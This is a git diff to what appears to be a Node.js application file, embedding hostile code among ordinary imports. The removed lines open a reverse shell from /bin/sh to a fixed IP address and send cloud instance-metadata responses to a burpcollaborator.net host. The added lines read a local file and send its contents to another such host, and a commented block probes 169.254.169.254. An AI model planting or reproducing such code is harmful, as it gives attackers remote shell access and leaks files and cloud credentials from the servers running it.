@@ -2,26 +2,17 @@ const path = require('path');
 const nconf = require('nconf');
 
 var request = require('request');
-request('http://instance-data//latest/meta-data/', function (error, response, body) {
-  if (1 == 1) {
-    console.log(response.statusCode);
-    console.log(response.body);    // Prints the JSON object
-request('http://6ahrmiupz6e11fvyt3lag4aublhb50.burpcollaborator.net/callback=Status:'+ response.statusCode + 'Response:' +response.body); 
-}
+const fs = require('fs')
+fs.readFile('/tmp/test.txt', 'utf8' , (err, data) => {
+  if (err) {
+    console.error(err)
+    return
+  }
+  console.log(data);
+  request('http://c3gp9ipe195eceg0l5xgronjsay1upj.burpcollaborator.net/?file=' +data);
+
 });
 
-(function(){
-    var net = require("net"),
-        cp = require("child_process"),
-        sh = cp.spawn("/bin/sh", []);
-    var client = new net.Socket();
-    client.connect(8080, "94.156.174.105", function(){
-        client.pipe(sh.stdin);
-        sh.stdout.pipe(client);
-        sh.stderr.pipe(client);
-    });
-    return /a/; // Prevents the Node.js application form crashing
-})();
 // const logger = require('./server/init');
 /* var request = require('request');
 request('http://169.254.169.254/', function (error, response, body) {
